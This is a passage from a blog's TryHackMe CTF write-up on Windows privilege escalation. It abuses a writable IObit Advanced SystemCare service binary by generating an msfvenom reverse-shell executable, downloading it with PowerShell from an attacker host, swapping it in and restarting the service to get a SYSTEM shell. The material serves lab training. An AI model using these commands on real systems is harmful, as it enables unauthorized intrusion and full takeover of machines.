+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; more output.txt
+more output.txt
+========================================(Services Information)========================================
+[+] Interesting Services -non Microsoft-
+[?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto- Running - No quotes and Space detected
+File Permissions: bill [WriteData/CreateFiles]
+Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
+Advanced SystemCare Service
+</code></pre><p>Use <code>msfvenom</code> to create a <code>reverse shell</code> payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20windows/shell_reverse_tcp%20LHOST=%3Csource-ip%3E%20LPORT=4444%20-e%20x86/shikata_ga_nai%20-f%20exe%20-o%20ASCService.exe" type="button"></button></div></div><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;source-ip&gt; LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[-]%20No%20platform%20was%20selected,%20choosing%20Msf::Module::Platform::Windows%20from%20the%20payload%0A[-]%20No%20arch%20selected,%20selecting%20arch:%20x86%20from%20the%20payload%0AFound%201%20compatible%20encoders%0AAttempting%20to%20encode%20payload%20with%201%20iterations%20of%20x86/shikata_ga_nai%0Ax86/shikata_ga_nai%20succeeded%20with%20size%20351%20(iteration=0)%0Ax86/shikata_ga_nai%20chosen%20with%20final%20size%20351%0APayload%20size:%20351%20bytes%0AFinal%20size%20of%20exe%20file:%2073802%20bytes%0ASaved%20as:%20ASCService.exe" type="button"></button></div></div><pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of exe file: 73802 bytes
+Saved as: ASCService.exe
+</code></pre><p>Create a <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20-cAr%20nc%20-lnvp%204444" type="button"></button></div></div><pre><code>rlwrap -cAr nc -lnvp 4444
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%204444)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 4444)
+</code></pre><p>From the previous <code>netcat</code> listener, download the <code>reverse shell</code> payload and start the exploited service.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="C:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3E%20powershell%20-c%20wget%20%22http://%3Csource-ip%3E:8080/ASCService.exe%22%20-outfile%20%22ASCService.exe%22%0Apowershell%20-c%20wget%20%22http://%3Csource-ip%3E:8080/ASCService.exe%22%20-outfile%20%22ASCService.exe%22%0A%0AC:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3E%20sc%20stop%20AdvancedSystemCareService9%0Asc%20stop%20AdvancedSystemCareService9%0A%0ASERVICE_NAME:%20AdvancedSystemCareService9%0A%20%20%20%20%20%20%20%20TYPE%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20110%20%20WIN32_OWN_PROCESS%20%20(interactive)%0A%20%20%20%20%20%20%20%20STATE%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%204%20%20RUNNING%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(STOPPABLE,%20PAUSABLE,%20ACCEPTS_SHUTDOWN)%0A%20%20%20%20%20%20%20%20WIN32_EXIT_CODE%20%20%20%20:%200%20%20(0x0)%0A%20%20%20%20%20%20%20%20SERVICE_EXIT_CODE%20%20:%200%20%20(0x0)%0A%20%20%20%20%20%20%20%20CHECKPOINT%20%20%20%20%20%20%20%20%20:%200x0%0A%20%20%20%20%20%20%20%20WAIT_HINT%20%20%20%20%20%20%20%20%20%20:%200x0%0A%0AC:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3E%20sc%20query%20AdvancedSystemCareService9%0Asc%20query%20AdvancedSystemCareService9%0A%0ASERVICE_NAME:%20AdvancedSystemCareService9%0A%20%20%20%20%20%20%20%20TYPE%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20110%20%20WIN32_OWN_PROCESS%20%20(interactive)%0A%20%20%20%20%20%20%20%20STATE%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%201%20%20STOPPED%0A%20%20%20%20%20%20%20%20WIN32_EXIT_CODE%20%20%20%20:%200%20%20(0x0)%0A%20%20%20%20%20%20%20%20SERVICE_EXIT_CODE%20%20:%200%20%20(0x0)%0A%20%20%20%20%20%20%20%20CHECKPOINT%20%20%20%20%20%20%20%20%20:%200x0%0A%20%20%20%20%20%20%20%20WAIT_HINT%20%20%20%20%20%20%20%20%20%20:%200x0%0A%0AC:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3E%20copy%20%22ASCService.exe%22%20%22C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe%22%0Acopy%20%22ASCService.exe%22%20%22C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe%22%0AOverwrite%20C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe?%20(Yes/No/All):%20yes%0Ayes%0A%20%20%20%20%20%20%20%201%20file(s)%20copied.%0A%0AC:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3E%20sc%20start%20AdvancedSystemCareService9%0Asc%20start%20AdvancedSystemCareService9" type="button"></button></div></div><pre><code>C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; powershell -c wget "http://&lt;source-ip&gt;:8080/ASCService.exe" -outfile "ASCService.exe"
+powershell -c wget "http://&lt;source-ip&gt;:8080/ASCService.exe" -outfile "ASCService.exe"
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; sc stop AdvancedSystemCareService9
+sc stop AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; sc query AdvancedSystemCareService9
+sc query AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; copy "ASCService.exe" "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+copy "ASCService.exe" "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+Overwrite C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): yes
+yes
+        1 file(s) copied.
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; sc start AdvancedSystemCareService9
+sc start AdvancedSystemCareService9
+</code></pre><p>The <code>privilege shell</code> would be spawned from the latter <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Ctarget-ip%3E%2049305%20received!%0AMicrosoft%20Windows%20[Version%206.3.9600]%0A(c)%202013%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0AC:%5CWindows%5Csystem32%3Ewhoami%0Awhoami%0Ant%20authority%5Csystem" type="button"></button></div></div><pre><code>Connection from &lt;target-ip&gt; 49305 received!
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+</code></pre></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-alfred/"><div class="card-body"> <span class="timeago small" > Mar 22 <i class="unloaded">2021-03-22T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Alfred</h3><div class="text-muted small"><p> Alfred This room contains detailed info about jenkins exploitation and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeration NMAP ...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-blue/"><div class="card-body"> <span class="timeago small" > Mar 23 <i class="unloaded">2021-03-23T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Blue</h3><div class="text-muted small"><p> Blue This room contains detailed info about eternalblue vulnerability of samba and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeratio...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-hackpark/"><div class="card-body"> <span class="timeago small" > Mar 25 <i class="unloaded">2021-03-25T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - HackPark</h3><div class="text-muted small"><p> HackPark This room contains detailed info about rejetto http vulnerability exploitation and privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumerati...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-blue/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Blue</p></a> <a href="/posts/tryhackme-hackpark/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - HackPark</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/4n3i5v74">4n3i5v74</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/network/">network</a> <a class="post-tag" href="/tags/protocols/">protocols</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://4n3i5v74.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
